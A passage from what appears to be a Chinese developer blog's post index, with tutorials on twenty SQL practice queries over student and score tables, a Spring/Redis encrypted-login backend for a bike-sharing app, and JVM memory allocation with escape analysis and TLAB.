    <content type="text"><![CDATA[特地找了20个语句对sql语句进行训练了一下。 1、查询语文成绩比数学成绩好的学生的学号1234567891011121、拿到语文科目的所有分数id和分数：SELECT Sid,score from score WHERE Cid=12、拿到数学科目的所有分数id和分数：SELECT Sid,score FROM score WHERE Cid=23、找到同一个学生对应的语文分数比数学分数高的人：SELECT a.Sid from (SELECT Sid,score from score WHERE Cid=1) a, (SELECT Sid,score FROM score WHERE Cid=2) bWHERE a.score&gt;b.score and a.Sid=b.Sid 2、查询平均成绩大于60分的同学的学号和平均成绩123456789SELECT sc.Sid, AVG(sc.score)FROM score scGROUP BY sc.SidHAVING AVG(sc.score) &gt; 60 3、查询所有同学的学号、姓名、选课数、总成绩12345678910SELECT st.Sid AS '学号', st.Sname AS '学生姓名', COUNT(sc.Cid) AS '选课数', SUM(sc.score) AS '总分'FROM student stJOIN score sc ON st.Sid = sc.SidGROUP BY st.Sid 4、查询姓“王”的老师的个数123456SELECT count(te.Tname)FROM teacher teWHERE te.Tname LIKE '王%' 5、查询没学过“王二”老师课的同学的学号、姓名123456789101112131415161718192021#1、找出所有学生对应的学号和老师SELECT st.Sid,te.Tname from student stJOIN score sc ON st.Sid = sc.SidJOIN course co on sc.Cid = co.CidJOIN teacher te ON co.Tid = te.Tid#2、找到所有老师是王五的学生id和姓名SELECT st.Sid,st.Sname,te.Tname from student stJOIN score sc ON st.Sid = sc.SidJOIN course co on sc.Cid = co.CidJOIN teacher te ON co.Tid = te.TidWHERE te.Tname='王五'#3、最后将王五的全部剔除，就是没有学王五课的学生信息SELECT st.Sid,st.Sname from student st WHERE st.Sid NOT IN(SELECT st.Sid from student stJOIN score sc ON st.Sid = sc.SidJOIN course co on sc.Cid = co.CidJOIN teacher te ON co.Tid = te.TidWHERE te.Tname='王五') 6、查询学过“语文”并且也学过“数学”课程的同学的学号、姓名1234567891011121314#1、找到学过"语文"的学生SELECT st.Sid from student st JOIN score sc ON st.Sid = sc.Sid AND sc.Cid = 1#2、在学过语文的学生中再找出学数学的学生SELECT st.Sid,st.Sname from student st JOIN score sc ON st.Sid = sc.Sid AND sc.Cid = 2AND st.Sid IN(SELECT st.Sid from student st JOIN score sc ON st.Sid = sc.Sid AND sc.Cid = 1) 7、查询课程编号“数学”的成绩比课程编号“语文”课程低的所有同学的学号、姓名1234567891011121314151617#1、先找到课程为语文的所有人的分数SELECT * from score sc WHERE sc.Cid=1#2、先找到课程为数学的所有人的分数SELECT * from score sc WHERE sc.Cid=2#3、找到语文比数学成绩好的学生的成绩SELECT * FROM (SELECT * from score sc WHERE sc.Cid=1) sc1,(SELECT * from score sc WHERE sc.Cid=2) sc2WHERE sc1.score&gt;sc2.score AND sc1.Sid=sc2.Sid#4、将学生信息再拿出来SELECT st.Sid,st.Sname from student st WHERE st.Sid IN(SELECT sc1.Sid FROM (SELECT * from score sc WHERE sc.Cid=1) sc1,(SELECT * from score sc WHERE sc.Cid=2) sc2WHERE sc1.score&gt;sc2.score AND sc1.Sid=sc2.Sid) 8、查询所有课程成绩小于60分的同学的学号、姓名123SELECT DISTINCT st.Sid,st.Sname from student stJOIN score sc on st.Sid = sc.SidWHERE sc.score&lt;60 9、查询没有学全所有课的同学的学号、姓名12345678910#1、统计出所有学生学习的课程数SELECT COUNT(sc.Cid) from student stJOIN score sc on st.Sid=sc.SidGROUP BY sc.Sid#2、每个学生学习的课程数小于总课程数，说明没有学全SELECT st.Sid,st.Sname from student stJOIN score sc on st.Sid=sc.SidGROUP BY sc.SidHAVING COUNT(sc.Cid)&lt;(SELECT count(*) FROM course) 10、 查询至少有一门课与学号为“1”的同学所学相同的同学的学号和姓名12345678#1、找出学号为1的学生所学的课程idSELECT sc.Cid from student st,score sc WHERE st.Sid=sc.Sid AND st.Sid=1#2、从查询结果来看是选择了语文（1）和数学（2）SELECT DISTINCT st.Sid,st.Sname from student st,score sc WHERE st.Sid=sc.SidAND sc.Cid IN( SELECT sc.Cid from student st,score sc WHERE st.Sid=sc.Sid AND st.Sid=1) 11、查询和“1”号的同学学习的课程完全相同的其他同学学号和姓名12345678910111213141516171819202122232425#1、找到2号同学所有学的课程SELECT sc.Cid from student stJOIN score sc on st.Sid=sc.SidWHERE st.Sid=2#2、找到有跟他学的不一样的学生SELECT DISTINCT st.Sid,st.Sname from student st,score sc WHERE st.Sid=sc.SidAND sc.Cid not in ( SELECT sc.Cid from student st JOIN score sc on st.Sid=sc.Sid WHERE st.Sid=1)#3、再找出一样的学生，并且将他自己剔除SELECT DISTINCT st.Sid,st.Sname from student st,score sc WHERE st.Sid=sc.SidAND st.Sid not in( SELECT DISTINCT st.Sid from student st,score sc WHERE st.Sid=sc.Sid AND sc.Cid not in ( SELECT sc.Cid from student st JOIN score sc on st.Sid=sc.Sid WHERE st.Sid=1 ))AND st.Sid!=1 12、按平均成绩从高到低显示所有学生的三门的课程成绩,按如下形式显示： 学生ID,语文,数学,英语,有效课程数,有效平均分123456789101112131415161718#1、根据学生id分组，按照学生的平均成绩排序SELECT *FROM student stJOIN score sc ON st.Sid=sc.SidGROUP BY st.SidORDER BY AVG(sc.score)#2、按照要求显示SELECT st.Sid AS '学生id',(SELECT score from score WHERE Cid=1 and st.Sid=Sid) AS '语文',(SELECT score from score WHERE Cid=2 and st.Sid=Sid) AS '数学',(SELECT score from score WHERE Cid=3 and st.Sid=Sid) AS '英语',COUNT(*) AS '有效课程数',AVG(sc.score) AS '平均分'FROM student stJOIN score sc ON st.Sid=sc.SidGROUP BY st.SidORDER BY AVG(sc.score) 13、查询各科成绩最高和最低的分：以如下形式显示：课程ID，最高分，最低分12345SELECT sc.Cid,MAX(sc.score) AS '最高分',MIN(sc.score) AS '最低分' from student stJOIN score sc on st.Sid=sc.SidGROUP BY sc.Cid 14、检索“语文”课程分数小于60，按分数降序排列的同学学号1234SELECT st.Sid,st.Sname from student stJOIN score sc ON st.Sid=sc.SidWHERE sc.score&lt;60 AND sc.Cid=1ORDER BY sc.score DESC 15、查询两门以上不及格课程的同学的学号及其平均成绩12345678910111213141516#1、先查询出挂科超过两门的学生idSELECT sc.Sid from score sc WHERE sc.score&lt;60 GROUP BY sc.Sid HAVING count(*)&gt;2#2、再相应地查出学生的信息SELECT st.Sid,AVG(sc.score) from student stJOIN score sc on st.Sid=sc.SidWHERE st.Sid in( SELECT sc.Sid from score sc WHERE sc.score&lt;60 GROUP BY sc.Sid HAVING count(*)&gt;2)GROUP BY st.Sid 16、查询没学过“王五”老师讲授的任一门课程的学生姓名123456789101112131415#1、查出报名王五老师课程的学生idSELECT st.Sid from student stJOIN score sc on st.Sid=sc.SidJOIN course co on sc.Cid=co.CidJOIN teacher te on co.Tid=te.TidWHERE te.Tname="王五"#3、找出没有上王五老师课的学生是哪些SELECT * from student st WHERE st.Sid not in(SELECT st.Sid from student stJOIN score sc on st.Sid=sc.SidJOIN course co on sc.Cid=co.CidJOIN teacher te on co.Tid=te.TidWHERE te.Tname="王五") 17、查询选修全部课程的学生12345678910#1、查出每个学生选修的课程数SELECT st.Sid,st.Sname,count(sc.Cid) from student stJOIN score sc on st.Sid=sc.SidGROUP BY sc.Sid#2、再找出数量等于全部课程的学生SELECT st.Sid,st.Sname,count(sc.Cid) from student stJOIN score sc on st.Sid=sc.SidGROUP BY sc.SidHAVING count(sc.Cid)=(SELECT count(*) FROM course) 18、查询全部学生都选修的课程的课程号和课程名12345#1、在分数表中找出每种课程的选修人数SELECT sc.Cid,count(sc.Cid) from score sc GROUP BY sc.Cid#2、人数等于7(8号学生无任何参与)说明所有人都选了SELECT * from course co where co.Cid=(SELECT sc.Cid from score sc GROUP BY sc.Cid HAVING count(sc.Cid) = 7) 19、检索至少选修两门课程的学生学号12345678910#1、先选出每个学生选秀的课程SELECT count(sc.Cid) from student stJOIN score sc on sc.Sid=st.Sidgroup by sc.Sid#2、再选出选秀课程超过2门的学生SELECT st.Sid,st.Sname from student stJOIN score sc on sc.Sid=st.Sidgroup by sc.SidHAVING count(sc.Cid)&gt;=2 20、统计每门课程的学生选修人数1234#1、统计出每门选秀的学生数SELECT count(sc.Sid) from student stJOIN score sc on sc.Sid=st.SidGROUP BY sc.Cid]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四、整合用户登录功能]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%9B%9B%E3%80%81%E6%95%B4%E5%90%88%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[用户登录功能 1、用户登陆controller123456789101112131415161718192021222324@RequestMapping(value="/login",method = RequestMethod.POST,produces = MediaType.APPLICATION_JSON_VALUE) public ApiResult&lt;String&gt; login(@RequestBody LoginInfo loginInfo)&#123;//loginInfo表示登陆验证信息 ApiResult&lt;String&gt; resp = new ApiResult&lt;&gt;();//返回消息对象 try &#123; String data = loginInfo.getData(); String key = loginInfo.getKey(); //校验是否为空，自定义异常 if(StringUtils.isBlank(data) || StringUtils.isBlank(key))&#123; throw new BikeException("校验失败"); &#125; //如果数据是有的，那么就传到service层进行处理吧，正常就返回token凭据 String token = userService.login(data,key); resp.setData(token); &#125;catch (BikeException be)&#123; resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage(be.getMessage()); &#125; catch (Exception e)&#123; log.error("fail to login",e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp; &#125; 其中，用户登录消息实体类: 1234567@Datapublic class LoginInfo &#123; /*登陆信息*/ private String data; /*RSA加密的AES密钥*/ private String key;&#125; 返回信息的封装类，暂时的： 123456@Datapublic class ApiResult &lt;T&gt;&#123; private int code = Constants.RESP_STATUS_OK; private String message; private T data;&#125; 相应的状态码： 1234567891011public class Constants &#123; /**自定义状态码 start**/ public static final int RESP_STATUS_OK = 200; public static final int RESP_STATUS_NOAUTH = 401; public static final int RESP_STATUS_INTERNAL_ERROR = 500; public static final int RESP_STATUS_BADREQUEST = 400; /**自定义状态码 end**/&#125; 自定义异常类： 123456789public class BikeException extends Exception&#123; public BikeException(String message)&#123; super(message); &#125; public int getStatusCode()&#123; return Constants.RESP_STATUS_INTERNAL_ERROR; &#125;&#125; 2、用户登陆service1234567891011121314151617181920212223242526272829303132@Overridepublic String login(String data, String key) throws BikeException &#123; String token = null; String decryptData = null; try &#123; //RSA解密拿到key byte[] aesKey = RSAUtil.decryptByPrivateKey(Base64Util.decode(key)); //AES拿到明文 decryptData = AESUtil.decrypt(data,new String(aesKey,"UTF-8")); if(decryptData==null)&#123; throw new Exception(); &#125; //fastajson解析json数据 JSONObject jsonObject = JSON.parseObject(decryptData); String mobile = jsonObject.getString("mobile"); String code = jsonObject.getString("code"); String platform = jsonObject.getString("platform"); if(StringUtils.isBlank(mobile) || StringUtils.isBlank(code))&#123; throw new Exception(); &#125; //拿到手机号码和验证码，去redis取验证码，比较手机号码和验证码是不是匹配 //检查用户是否存在 存在 生成token存redis 不存在就注册 插入数据库 &#125; catch (Exception e) &#123; log.error("fail to decrypt data",e); throw new BikeException("数据解析错误"); &#125; return null;&#125; 3、postman模拟请求首先是准备好安卓端发来的加密后的data和加密后的key: 12345678910111213//key，应该由app随机生成16位或者16的倍数位，这里就先写死String key = "1234567890qwerty";//数据String dataToEn = "&#123;'mobile':'123456789','code':'6666'，'platform':'android'&#125;";//用对称加密算法对数据进行对称加密String enResult = encrypt(dataToEn,key);System.out.println("AES对明文加密后的结果："+enResult);//用RSA对key用公钥进行非对称加密byte[] enkey = RSAUtil.encryptByPublicKey(key.getBytes("UTF-8"),"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHJkbiCWMzQyOOKeGopxP7Pl3ptFcuahVxAqK+o9FBGpcTr02ErKw42Oy3eYxLuIF1XSBVBFwdRWI9RueMo6rZtwJMmtT5cuMIAyDidEuvM0l1wurV6g0nbQK44J20DemG7iIJDpxJhjbBQknODDrafCRo9CVbynDvo6DnFkhXawIDAQAB");//再用base64对加密后的key编码一下，保证传输String baseKey = Base64Util.encode(enkey);System.out.println("RSA对key加密后的结果："+baseKey); 获取到之后，填充到postman的请求json体中： 1234567url:localhost:8888/user/login以raw json的形式发送请求&#123; "data":"FbDx87KsEZRvohoaHkw67m51MSoemXVmGvvmIwa6KWStfk9WlLI/23QYZyWA RaqQ9YyszQCHzj5EBPS5e39bvg==", "key":"WMIpXSh7kdcnXzIi2WOUd77QBZc5PAxT14EK6SiO7bWpfuDcrnffMTN+xcQc /mxEIB4fNjdG5l6YklfXJgpMeoFBBzfMKJDGE5+TJe7VLQku5xnXzTJ4obuy TVdCycguAQvaD09dDIePsLjYwGLoGNAqhUxA6+XidKHWsJADL7M=", "platform":"android"&#125; 打断点进行测试看是否能拿到用户的数据(略)。 4、整合redis添加jedis依赖： 1234&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt;&lt;/dependency&gt; 配置redis： 1234567#reidsredis: host: 127.0.0.1 port: 6379 max-idle: 5 max-total: 10 max-wait-millis: 3000 为了防止注入混乱，引入redis池。首先是定义一个类，将redis配置信息放在一个地方统一管理。 123456789101112131415161718@Component@Datapublic class Parameters &#123; /*****redis config start*******/ @Value("$&#123;redis.host&#125;") private String redisHost; @Value("$&#123;redis.port&#125;") private int redisPort; //@Value("$&#123;redis.auth&#125;") //private String redisAuth; @Value("$&#123;redis.max-idle&#125;") private int redisMaxTotal; @Value("$&#123;redis.max-total&#125;") private int redisMaxIdle; @Value("$&#123;redis.max-wait-millis&#125;") private int redisMaxWaitMillis; /*****redis config end*******/&#125; 接下来就是写一个池的类，将redis信息注入，返回池对象，操作redis的时候，直接拿： 123456789101112131415161718192021222324252627282930@Component@Slf4jpublic class JedisPoolWrapper &#123; private JedisPool jedisPool = null; @Autowired private Parameters parameters; @PostConstruct public void init() throws BikeException &#123; try &#123; JedisPoolConfig config = new JedisPoolConfig(); config.setMaxTotal(parameters.getRedisMaxTotal()); config.setMaxIdle(parameters.getRedisMaxIdle()); config.setMaxWaitMillis(parameters.getRedisMaxWaitMillis()); jedisPool = new JedisPool(config,parameters.getRedisHost(),parameters.getRedisPort(),2000); &#125; catch (Exception e) &#123; log.error("Fail to initialize jedis pool", e); throw new BikeException("Fail to initialize jedis pool"); &#125; &#125; public JedisPool getJedisPool() &#123; return jedisPool; &#125;&#125; 注意这里有一个注解 @PostConstruct 当实例化这个JedisPoolWrapper类时，就会先执行这个注解的方法。 下面就可以操作redis了，写一个操作redis的工具类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091@Component@Slf4jpublic class CommonCacheUtil &#123; @Autowired private JedisPoolWrapper jedisPoolWrapper; /** * 缓存 可以value 永久 * @param key * @param value */ public void cache(String key, String value) &#123; try &#123; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis Jedis = pool.getResource()) &#123; Jedis.select(0); Jedis.set(key, value); &#125; &#125; &#125; catch (Exception e) &#123; log.error("Fail to cache value", e); &#125; &#125; /** * 获取缓存key * @param key * @return */ public String getCacheValue(String key) &#123; String value = null; try &#123; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis Jedis = pool.getResource()) &#123; Jedis.select(0); value = Jedis.get(key); &#125; &#125; &#125; catch (Exception e) &#123; log.error("Fail to get cached value", e); &#125; return value; &#125; /** * 设置key value 以及过期时间 * @param key * @param value * @param expiry * @return */ public long cacheNxExpire(String key, String value, int expiry) &#123; long result = 0; try &#123; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis jedis = pool.getResource()) &#123; jedis.select(0); result = jedis.setnx(key, value); jedis.expire(key, expiry); &#125; &#125; &#125; catch (Exception e) &#123; log.error("Fail to cacheNx value", e); &#125; return result; &#125; /** * 删除缓存key * @param key */ public void delKey(String key) &#123; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis jedis = pool.getResource()) &#123; jedis.select(0); try &#123; jedis.del(key); &#125; catch (Exception e) &#123; log.error("Fail to remove key from redis", e); &#125; &#125; &#125; &#125;&#125; 五、下面继续登陆逻辑 1234567891011121314151617181920212223242526272829303132333435//拿到手机号码和验证码，去redis取验证码，比较手机号码和验证码是不是匹配String verCode = commonCacheUtil.getCacheValue(mobile);User user;/*判断接收的code和缓存中code比较是否相等*/if(code.equals(verCode))&#123; //验证码匹配 user = userMapper.selectByMobile(mobile); if(user==null)&#123; //用户注册,存进数据库 user = new User(); user.setMobile(mobile); user.setNickname(mobile); userMapper.insertSelective(user); &#125;&#125;else &#123; throw new BikeException("手机号码验证码不匹配");&#125;//生成token并返回try &#123; token = generatToken(user);&#125; catch (Exception e) &#123; throw new BikeException("token生成错误");&#125;UserElement ue = new UserElement();ue.setMobile(mobile);ue.setUserId(user.getId());ue.setToken(token);ue.setPlatform(platform);commonCacheUtil.putTokenWhenLogin(ue);...return token; 这里是将获取到的验证码和缓存中的验证码进行对比，缓存中的验证码暂时只能先写死，如果验证码是正确的，那么要么执行登陆，要么自动执行注册。完了之后给用户一个token，这个token就是唯一标识用户的session了。用户每次请求都把这个token携带过来进行判断是否正确和超时。所以：token ---user---userId要有一个连接关系，通过userID可以获取token，通过token可以获取用户信息。所以就有了UserElement类，这个类用于存储进redis： 1234567891011121314151617181920212223242526272829303132333435363738394041424344@Datapublic class UserElement &#123; private Long userId; private String mobile; private String token; private String platform; private String pushUserId; private String pushChannelId; /** * 转 map * @return */ public Map&lt;String, String&gt; toMap() &#123; Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;(); map.put("platform", this.platform); map.put("userId", this.userId + ""); map.put("token", token); map.put("mobile", mobile); if (this.pushUserId != null) &#123; map.put("pushUserId", this.pushUserId); &#125; if (this.pushChannelId != null) &#123; map.put("pushChannelId", this.pushChannelId); &#125; return map; &#125; /** * map转对象 * @param map * @return */ public static UserElement fromMap(Map&lt;String, String&gt; map) &#123; UserElement ue = new UserElement(); ue.setPlatform(map.get("platform")); ue.setToken(map.get("token")); ue.setMobile(map.get("mobile")); ue.setUserId(Long.parseLong(map.get("userId"))); ue.setPushUserId(map.get("pushUserId")); ue.setPushChannelId(map.get("pushChannelId")); return ue; &#125;&#125; 注意到 commonCacheUtil.putTokenWhenLogin(ue);该方法为： 12345678910111213141516171819202122232425262728/** * 登录时设置token * @param ue */public void putTokenWhenLogin(UserElement ue) &#123; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis jedis = pool.getResource()) &#123; jedis.select(0); /*redis事务*/ Transaction trans = jedis.multi(); try &#123; trans.del(TOKEN_PREFIX + ue.getToken()); /*token为value，value为用户信息*/ trans.hmset(TOKEN_PREFIX + ue.getToken(), ue.toMap()); /*设置过时时间*/ trans.expire(TOKEN_PREFIX + ue.getToken(), 2592000); /*userid为key,token为value*/ trans.sadd(USER_PREFIX + ue.getUserId(), ue.getToken()); trans.exec(); &#125; catch (Exception e) &#123; trans.discard(); log.error("Fail to cache token to redis", e); &#125; &#125; &#125;&#125; 用于存储以上提到的两个关系。 还是AESUtils.java生成密文和加密的key： 12345678910111213//key，应该由app随机生成16位或者16的倍数位，这里就先写死 String key = "1234567890qwerty"; //数据 String dataToEn = "&#123;'mobile':'15895967012','code':'6666','platform':'android'&#125;"; //用对称加密算法对数据进行对称加密 String enResult = encrypt(dataToEn,key); System.out.println("AES对明文加密后的结果："+enResult); //用RSA对key用公钥进行非对称加密 byte[] enkey = RSAUtil.encryptByPublicKey(key.getBytes("UTF-8"),"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHJkbiCWMzQyOOKeGopxP7Pl3ptFcuahVxAqK+o9FBGpcTr02ErKw42Oy3eYxLuIF1XSBVBFwdRWI9RueMo6rZtwJMmtT5cuMIAyDidEuvM0l1wurV6g0nbQK44J20DemG7iIJDpxJhjbBQknODDrafCRo9CVbynDvo6DnFkhXawIDAQAB"); //再用base64对加密后的key编码一下，保证传输 String baseKey = Base64Util.encode(enkey); System.out.println("RSA对key加密后的结果："+baseKey); 然后postman以json的形式发出去： 12345&#123; "data":"FbDx87KsEZRvohoaHkw67m51MSoemXVmGvvmIwa6KWStfk9WlLI/23QYZyWA RaqQ9YyszQCHzj5EBPS5e39bvg==", "key":"ITt6hnopuXbKNQXsvsmnbYUtIwNDbw9o1KYmLzAvtbBAg2zUKGl3BFCc04QU sRU5moZrTsetACoBuvDXqDrZgA+QzrY6zGiq+Yzq5XcXDpL6vzCkLUkV6rHz E7S/iq2s5JGyvW0LYof6Uaj7zPF5/UIDweeB6Ly5V5/ab45y6Lw=", "platform":"android"&#125; 正确返回： 1234&#123; "code": 200, "data": "token"&#125;]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四、内存分配和回收策略]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%9B%9B%E3%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%92%8C%E5%9B%9E%E6%94%B6%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[这里详细探讨java虚拟机内存分配和回收策略。 我们知道目前几乎所有商业虚拟机的垃圾收集器都采用分代收集算法，对于HotSpot一般的年代内存划分，如下图： 1. 对象优先在Eden分配前面文章曾介绍HotSpot虚拟机新生代内存布局及算法: （1）、将新生代内存分为一块较大的Eden空间和两块较小的Survivor空间； （2）、每次使用Eden和其中一块Survivor； （3）、当回收时，将Eden和使用中的Survivor中还存活的对象一次性复制到另外一块Survivor； （4）、而后清理掉Eden和使用过的Survivor空间； （5）、后面就使用Eden和复制到的那一块Survivor空间，重复步骤3； 默认Eden：Survivor=8:1，即每次可以使用90%的空间，只有一块Survivor的空间被浪费； 大多数情况下，对象在新生代Eden区中分配； 当Eden区没有足够空间进行分配时，JVM将发起一次Minor GC（新生代GC）； Minor GC时，如果发现存活的对象无法全部放入Survivor空间，只好通过分配担保机制提前转移到老年代。 2. 大对象直接进入老年代大对象指需要大量连续内存空间的Java对象，如，很长的字符串、数组； 经常出现大对象容易导致内存还有不少空间就提前触发GC,以获取足够的连续空间来存放它们，所以应该尽量避免使用创建大对象； “-XX:PretenureSizeThreshold”： 可以设置这个阈值，大于这个参数值的对象直接在老年代分配； 默认为0（无效），且只对Serail和ParNew两款收集器有效； 如果需要使用该参数，可考虑ParNew+CMS组合。 3. 长期存活的对象将进入老年代JVM给每个对象定义一个对象年龄计数器，其计算流程如下： 在Eden中分配的对象，经Minor GC后还存活，就复制移动到Survivor区，年龄为1； 而后每经一次Minor GC后还存活，在Survivor区复制移动一次，年龄就增加1岁； 如果年龄达到一定程度，就晋升到老年代中； “-XX:MaxTenuringThreshold”： 设置新生代对象晋升老年代的年龄阈值，默认为15； 4. 动态对象年龄判定JVM为更好适应不同程序，不是永远要求等到MaxTenuringThreshold中设置的年龄； 如果在Survivor空间中相同年龄的所有对象大小总和大于Survivor空间的一半，大于或等于该年龄的对象就可以直接进入老年代 5. 空间分配担保在前面曾简单介绍过分配担保： 当Survivor空间不够用时，需要依赖其他内存（老年代）进行分配担保（Handle Promotion）； 分配担保的流程如下： 在发生Minor GC前，JVM先检查老年代最大可用的连续空间是否大于新生所有对象空间； 如果大于，那可以确保Minor GC是安全的； 如果不大于，则JVM查看HandlePromotionFailure值是否允许担保失败； 如果允许，就继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小； 如果大于，将尝试进行一次Minor GC，但这是有风险的； 如果小于或HandlePromotionFailure值不允许冒险，那这些也要改为进行一次Full GC； 尝试Minor GC的风险–担保失败： 因为尝试Minor GC前面，无法知道存活的对象大小，所以使用历次晋升到老年代对象的平均大小作为经验值； 假如尝试的Minor GC最终存活的对象远远高于经验值的话，会导致担保失败（Handle Promotion Failure）； 失败后只有重新发起一次Full GC，这绕了一个大圈，代价较高； 但一般还是要开启HandlePromotionFailure，避免Full GC过于频繁，而且担保失败概率还是比较低的； JDK6-u24后，JVM代码中已经不再使用HandlePromotionFailure参数了； 规则变为： 只要老年代最大可用的连续空间大于新生所有对象空间或历次晋升到老年代对象的平均大小，就会进行Minor GC；否则进行Full GC； 即老年代最大可用的连续空间小于新生所有对象空间时，不再检查HandelPromotionFailure，而直接检查历次晋升到老年代对象的平均大小； 6. java中两种典型的对象不在堆上分配的情况般认为new出来的对象都是被分配在堆上，但是这个结论不是那么的绝对，通过对Java对象分配的过程分析，可以知道有两个地方会导致Java中new出来的对象并不一定分配在所认为的堆上。这两个点分别是Java中的逃逸分析和TLAB（Thread Local Allocation Buffer）。 先来聊聊逃逸分析6.1 什么是栈上分配？栈上分配主要是指在Java程序的执行过程中，在方法体中声明的变量以及创建的对象，将直接从该线程所使用的栈中分配空间。 一般而言，创建对象都是从堆中来分配的，这里是指在栈上来分配空间给新创建的对象。 6.2 什么是逃逸？逃逸是指在某个方法之内创建的对象，除了在方法体之内被引用之外，还在方法体之外被其它变量引用到； 这样带来的后果是在该方法执行完毕之后，该方法中创建的对象将无法被GC回收，由于其被其它变量引用。 正常的方法调用中，方法体中创建的对象将在执行完毕之后，将回收其中创建的对象； 故由于无法回收，即成为逃逸。 123456789101112static V global_v; public void a_method()&#123; V v=b_method(); c_method(); &#125; public V b_method()&#123; V v=new V(); return v; &#125; public void c_method()&#123; global_v=new V(); &#125; 其中b_method方法内部生成的V对象的引用被返回给a_method方法内的变量v，c_method方法内生成的V对象被赋给了全局变量global_v。这两种场景都发生了（引用）逃逸。 再来个例子： 6.3 逃逸分析在JDK 6之后支持对象的栈上分析和逃逸分析，在JDK7中完全支持栈上分配对象。其是否打开逃逸分析依赖于以下JVM的设置： -XX:+DoEscapeAnalysis 6.4 栈上分配与逃逸分析的关系进行逃逸分析之后，产生的后果是所有的对象都将由栈上分配，而非从JVM内存模型中的堆来分配。 6.5 逃逸分析／栈上分配的优劣分析优势表现在以下两个方面： 消除同步。 线程同步的代价是相当高的，同步的后果是降低并发性和性能。逃逸分析可以判断出某个对象是否始终只被一个线程访问，如果只被一个线程访问，那么对该对象的同步操作就可以转化成没有同步保护的操作，这样就能大大提高并发程度和性能。 矢量替代。 逃逸分析方法如果发现对象的内存存储结构不需要连续进行的话，就可以将对象的部分甚至全部都保存在CPU寄存器内，这样能大大提高访问速度。 劣势： 栈上分配受限于栈的空间大小，一般自我迭代类的需求以及大的对象空间需求操作，将导致栈的内存溢出；故只适用于一定范围之内的内存范围请求。 6.6 测试123456789101112131415161718192021222324class EscapeAnalysis &#123; private static class Foo &#123; private int x; private static int counter; //会发生逃逸 public Foo() &#123; x = (++counter); &#125; &#125; public static void main(String[] args) &#123; //开始时间 long start = System.nanoTime(); for (int i = 0; i &lt; 1000 * 1000 * 10; ++i) &#123; Foo foo = new Foo(); &#125; //结束时间 long end = System.nanoTime(); System.out.println("Time cost is " + (end - start)); &#125;&#125; 未开启逃逸分析设置为： -server -verbose:gc 在未开启逃逸分析的状况下运行情况如下： 12345678910[GC 5376K-&gt;427K(63872K), 0.0006051 secs] [GC 5803K-&gt;427K(63872K), 0.0003928 secs] [GC 5803K-&gt;427K(63872K), 0.0003639 secs] [GC 5803K-&gt;427K(69248K), 0.0003770 secs] [GC 11179K-&gt;427K(69248K), 0.0003987 secs] [GC 11179K-&gt;427K(79552K), 0.0003817 secs] [GC 21931K-&gt;399K(79552K), 0.0004342 secs] [GC 21903K-&gt;399K(101120K), 0.0002175 secs] [GC 43343K-&gt;399K(101184K), 0.0001421 secs] Time cost is 58514571 开启逃逸分析设置为： -server -verbose:gc -XX:+DoEscapeAnalysis 开启逃逸分析的状况下，运行情况如下： Time cost is 10031306 未开启逃逸分析时，运行上诉代码，JVM执行了GC操作，而在开启逃逸分析情况下，JVM并没有执行GC操作。同时，操作时间上，开启逃逸分析的程序运行时间是未开启逃逸分析时间的1/5。 再来聊聊TLABJVM在内存新生代Eden Space中开辟了一小块线程私有的区域，称作TLAB（Thread-local allocation buffer）。默认设定为占用Eden Space的1%。在Java程序中很多对象都是小对象且用过即丢，它们不存在线程共享也适合被快速GC，所以对于小对象通常JVM会优先分配在TLAB上，并且TLAB上的分配由于是线程私有所以没有锁开销。因此在实践中分配多个小对象的效率通常比分配一个大对象的效率要高。也就是说，Java中每个线程都会有自己的缓冲区称作TLAB（Thread-local allocation buffer），每个TLAB都只有一个线程可以操作，TLAB结合bump-the-pointer技术可以实现快速的对象分配，而不需要任何的锁进行同步，也就是说，在对象分配的时候不用锁住整个堆，而只需要在自己的缓冲区分配即可。 最后的总结Java对象分配的过程 编译器通过逃逸分析，确定对象是在栈上分配还是在堆上分配。如果是在堆上分配，则进入选项2. 如果tlab_top + size &lt;= tlab_end，则在在TLAB上直接分配对象并增加tlab_top的值，如果现有的TLAB不足以存放当前对象则3. 重新申请一个TLAB，并再次尝试存放当前对象。如果放不下，则4. 在Eden区加锁（这个区是多线程共享的），如果eden_top + size &lt;= eden_end则将对象存放在Eden区，增加eden_top 的值，如果Eden区不足以存放，则5. 执行一次Young GC（minor collection）。 经过Young GC之后，如果Eden区任然不足以存放当前对象，则直接分配到老年代。 一、为什么不在堆上分配我们知道堆是由所有线程共享的，既然如此那它就是竞争资源，对于竞争资源，必须采取必要的同步，所以当使用new关键字在堆上分配对象时，是需要锁的。既然有锁，就必定存在锁带来的开销，而且由于是对整个堆加锁，相对而言锁的粒度还是比较大的，当对象频繁分配时，不免影响效率。 所以对于某些特殊情况，可以采取避免在堆上分配对象的办法，以提高对象创建和销毁的效率。 二、TLAB分配JVM在内存新生代Eden Space中开辟了一小块区域，由线程私有，称作TLAB（Thread-local allocation 